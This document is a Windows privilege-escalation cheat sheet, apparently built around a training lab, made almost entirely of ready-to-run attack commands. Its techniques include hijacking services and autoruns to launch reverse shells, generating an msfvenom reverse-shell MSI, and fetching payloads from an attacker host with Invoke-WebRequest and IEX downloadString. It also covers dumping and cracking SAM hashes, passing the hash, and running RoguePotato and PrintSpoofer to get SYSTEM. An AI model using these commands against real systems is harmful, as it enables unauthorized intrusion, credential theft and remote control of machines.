
Tools needed:
	Download AccessChk
		https://download.sysinternals.com/files/AccessChk.zip

[*] Insecure Service Perms
	Check services daclsvc:
		https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
		.\accesschk.exe /accepteula -uwcqv user daclsvc
	Query the Service Control config
		sc qc daclsvc # This is the name of the RW service
		sc config daclsvc binpath="\"C:\Path\To\reverse.exe""
	Start the service with a netcat listener started on attacker machine. This should pop an admin shell.
		net start daclsvc
	Keep in mind, you may need to run this from CMD, powershell gets weird with this.

[*] Unquoted Service Path
	check service unquotedsvc:
		sc qc unquotedsvc
			RW on Authority\System
		copy C:\Path\to\reverseshell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
		net start unquotedsvc
			reverse shell should be System user
[*] Weak Registry Permissions
	Notice SYSTEM privs (LocalSystem):)
		sc qc regsvc
		.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc # Notice everyone has RW
	Overwrite the file with a reverse shell:
		reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
		net start regsvc
[*] Insecure Service Executable
	Notice the BINARY_PATH_NAME file is writeable by anyone
		sc qc filepermsvc
	Overwrite the file with a reverse shell and restart service
		.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
		copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
		net start filepermsvc
[*] Registry - AutoRuns
	Query an executable autorun
		reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
		copy C:\Path\to\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
	RDP over and autorun will kick off, spawning your reverse shell. Real world, you would need an Admin to rdp to the machine.
		rdesktop 10.10.10.10"
[*] Registry - AlwaysInstallElevated
	Query registry for AlwaysInstallElevated keys. Look for 0x1, for 1:
		reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
		reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	Create an msi Windows payload using msfvenom and upload to windows:
		msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.20.20 LPORT=53 -f msi -o reverse.msi
		Invoke-WebRequest https://10.10.20.20/reverse.msi # Powershell command on Windows to download
		msiexec /quiet /qn /i C:\Path\to\reverse.msi
[*] Passwords - Registry
	Search the registry for passwords
		reg query HKLM /f password /t REG_SZ /s
	Another query looking directly for Admin autologin:
		req query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
	Assuming you found the password, login from Kali:
		winexe -U 'admin@password' //10.10.10.10 cmd.exe
[*] Password - Saved Creds
	Print any saved passwords
		cmdkey /list
	Example: Run reverse shell with runas admin:
		runas /savecred /user:admin C:\Path\to\reverse.exe
[*] Passwords - Security Account Manager (SAM)
	Find files that may store files in binaries for instance, then move them to your kali box.
	Install creddump
		git clone https://github.com/Tib3rius/creddump7
		pip3 install pycrypto
		python3 creddump7/pwdump.py file1 file2
	With your new wordlist, use john or hashcat to to crack the hashes
		hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
		john --wordlist="/usr/share/wordlist/rockyou.txt" --rules hashes_file --fork=2
[*] Passwords Passing the Hash
	Sometimes you do not need to crack a password hash, use the LM and NTLM hash as the password
		pth-winexe -U 'admin%LM:NTLMHASH' //10.10.10.10 cmd.exe
[*] Scheduled Tasks
	Check perms on a scheduled task file - if task is running as SYSTEM and is writable by you, OOF.
		accesschk.exe /accepteula -quvw user C:\Path\to\taskfile.ps1
	Add a reverse shell to the file:
	echo C:\Path\to\reverseshell.exe >> C:\Path\to\taskfile.ps1

[*] Insecure Apps
	Check tasks and search for admin or high user privs:
		tasklist /V
		tasklist /V | finstr admin # or any other user
	If app has a way to spawn shell, do it:
	Paint:
		File > Open > go to C:\Windows\system32\cmd.exe - Shell spawned
[*] Startup Apps
	Check your startup files for files we can write
		accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartupDir\"
	We find that we can add a file, so add one:
		cscript C:\file\to\shortcut.vbs
	We need to wait for an admin to login, but have your nc listener ready
[*] Rogue Potato Exploit
	Start a socat redirector on attacker machine:
		sudo socat tcp-listen:135,reuseaddr,fork tcp:VICTIMIP:9999
	Assuming you have a shell on the victim, upload the Rogue Potato exploit:
		Invoke-WebRequest http://ATTACKERIP:PORT/RoguePotato.exe -OutFile RoguePotato.exe
	Start nc listener on attacker machine:
		rlwrap nc -lvnp 1337
	On the Victim machine, reuse your payload, or upload another, and execute it with rogue potato
		.\RoguePotato.exe -r ATTACKERIP -e "C:\path\to\reverse.exe" -l 9999
	New shell should be authority\system
[*] PrintSpoofer Exploit
	Assuming you have a shell on the victim, upload PrintSpoofer
		Invoke-WebRequest http://ATTACKERIP:PORT/PrintSpoofer.exe -OutFile PrintSpoofer.exe
	Start a nc listener on the attacker machine:
		rlwrap nc -lvnp 1337
	On the victim Machine, kick off PrintSpoofer, your new reverse shell should be running as System:
		.\PrintSpoofer.exe -c "C:\path\to\PrintSpoofer.exe" -i
[*] Windows Privilege Escalation Scripts
	WINPeasany.exe
	Seatbelt.exe
	PowerUp.ps1
	SharpUp.exe

[*] Download files or Invoking
	Need a cmdlet? Use this link:
		https://github.com/RamblingCookieMonster/PowerShell
	Then use this syntaxt to import the command directly to powershell:
		IEX(New-Object Net.WebClient).downloadString('http://PUBLICIP/cmdlet_you_downloaded.ps1')
	To just download a file, use:
		Invoke-WebRequest http://PUBLICIP/file.exe -OutFile file.exe
	  OR
		(New-Object System.Net.WebClient).Downloadfile('http://ATTACKERIP:PORT/shell.exe','shell.exe')"

[*] Logging
	Using Powershell, find all log files:
		Get-ChildItem -Path C:\ -Filter *.log -Recurse -ErrorAction SilentlyContinue -Force
